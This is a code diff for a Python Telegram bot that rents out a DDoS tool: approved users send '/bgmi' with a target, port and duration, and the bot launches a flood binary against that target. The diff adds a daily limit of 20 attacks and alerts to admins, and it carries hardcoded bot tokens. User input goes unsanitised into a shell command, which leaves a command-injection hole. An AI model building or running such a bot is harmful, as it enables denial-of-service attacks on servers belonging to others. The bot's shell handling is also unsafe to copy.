@@ -4,30 +4,23 @@ import telebot
 import subprocess
 import datetime
 import time
-import re  # Import regex module for duration parsing
+import re  
 
-# Insert your Telegram bot token here
-bot = telebot.TeleBot('7614008286:AAFUsHnbzG8cD4wySaJWuZ0ZB4aD4YNarXc')
+bot = telebot.TeleBot('7614008286:AAEvqf7u1Ba58tkZXr5DHk_rRrTbxsQ5VRs')
 
-# Admin user IDs
 admin_id = ["1383324178", "6060545769", "1871909759"]
 
-# File to store approved users with expiry times
 APPROVED_USERS_FILE = "approved_users.txt"
-
-# Dictionary to track user attacks per day
 user_attacks = {}
 reset_time = datetime.datetime.now().replace(hour=0, minute=0, second=0, microsecond=0) + datetime.timedelta(days=1)
 MAX_ATTACKS_PER_DAY = 20
 
-# Reset attack count at midnight
 def reset_attack_counts():
     global reset_time, user_attacks
     if datetime.datetime.now() >= reset_time:
         user_attacks = {}
         reset_time = datetime.datetime.now().replace(hour=0, minute=0, second=0, microsecond=0) + datetime.timedelta(days=1)
 
-# Read approved users and their expiry times
 def read_approved_users():
     approved_users = {}
     try:
@@ -41,14 +34,12 @@ def read_approved_users():
         pass
     return approved_users
 
-# Store approved users in dictionary
 approved_users = read_approved_users()
 
-# ✅ Remove expired users
 def remove_expired_users():
     current_time = datetime.datetime.now()
     expired_users = []
-
+    
     for user_id, expiry_time in approved_users.items():
         expiry_date = datetime.datetime.strptime(expiry_time, "%Y-%m-%d %H:%M:%S")
         if current_time >= expiry_date:
@@ -57,12 +48,10 @@ def remove_expired_users():
     for user_id in expired_users:
         del approved_users[user_id]
 
-    # Rewrite the file without expired users
     with open(APPROVED_USERS_FILE, "w") as file:
         for uid, expiry_time in approved_users.items():
             file.write(f"{uid},{expiry_time}\n")
 
-# ✅ Function to parse duration (e.g., "2d3h" → 2 days, 3 hours)
 def parse_duration(duration_str):
     days, hours = 0, 0
     day_match = re.search(r'(\d+)d', duration_str)
@@ -75,7 +64,6 @@ def parse_duration(duration_str):
     
     return days, hours
 
-# ✅ Command: /approve <user_id> <duration>
 @bot.message_handler(commands=['approve'])
 def approve_user(message):
     user_id = str(message.chat.id)
@@ -91,9 +79,8 @@ def approve_user(message):
 
     target_user_id = command_parts[1]
     duration_str = command_parts[2]
-
-    # Parse duration
     days, hours = parse_duration(duration_str)
+
     if days == 0 and hours == 0:
         bot.reply_to(message, "⚠️ Invalid duration format! Use 'd' for days and 'h' for hours. Example: 2d5h")
         return
@@ -110,7 +97,6 @@ def approve_user(message):
     response = f"✅ User {target_user_id} approved!\n⏳ Duration: {days} days, {hours} hours\n📅 Expires on: {expiry_time_str}"
     bot.reply_to(message, response)
 
-# ✅ Command: /mytime (Check remaining time)
 @bot.message_handler(commands=['mytime'])
 def check_remaining_time(message):
     user_id = str(message.chat.id)
@@ -130,7 +116,6 @@ def check_remaining_time(message):
         hours, minutes = divmod(hours, 3600)
         bot.reply_to(message, f"⏳ You have {int(days)} days, {int(hours)} hours, and {int(minutes)} minutes left.")
 
-# ✅ Command: /deny <user_id> (Admins Only)
 @bot.message_handler(commands=['deny'])
 def deny_user(message):
     user_id = str(message.chat.id)
@@ -156,7 +141,6 @@ def deny_user(message):
     else:
         bot.reply_to(message, f"⚠️ User {target_user_id} is not in the approved list.")
 
-# ✅ Command: /bgmi <target> <port> <time>
 @bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
     reset_attack_counts()
@@ -167,6 +151,10 @@ def handle_bgmi(message):
         bot.reply_to(message, "🚫 You are not approved for attacks.")
         return
 
+    if user_attacks.get(user_id, 0) >= MAX_ATTACKS_PER_DAY:
+        bot.reply_to(message, "🚫 You have reached your daily limit of 20 attacks.")
+        return
+
     command = message.text.split()
     if len(command) == 4:
         target, port, duration = command[1], int(command[2]), int(command[3])
@@ -175,7 +163,14 @@ def handle_bgmi(message):
             bot.reply_to(message, "Error: Time must be less than 300 seconds.")
             return
 
+        user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
+        remaining_attacks = MAX_ATTACKS_PER_DAY - user_attacks[user_id]
+
         bot.reply_to(message, f"🔥 Attack Started!\n🎯 Target: {target}\n🔢 Port: {port}\n⏳ Duration: {duration} seconds")
+
+        for admin in admin_id:
+            bot.send_message(admin, f"🚨 **Attack Alert** 🚨\n👤 **User ID:** {user_id}\n🎯 **Target:** {target}\n🔢 **Port:** {port}\n⏳ **Duration:** {duration} seconds\n🔥 **Remaining Attacks:** {remaining_attacks}/20")
+
         subprocess.run(f"./bgmi {target} {port} {duration}", shell=True)
         time.sleep(duration)
         bot.send_message(user_id, f"✅ Attack Finished!\n🎯 Target: {target}")
@@ -183,7 +178,6 @@ def handle_bgmi(message):
     else:
         bot.reply_to(message, "✅ Usage: /bgmi <target> <port> <time>")
 
-# Run the bot
 while True:
     try:
         bot.polling(none_stop=True)
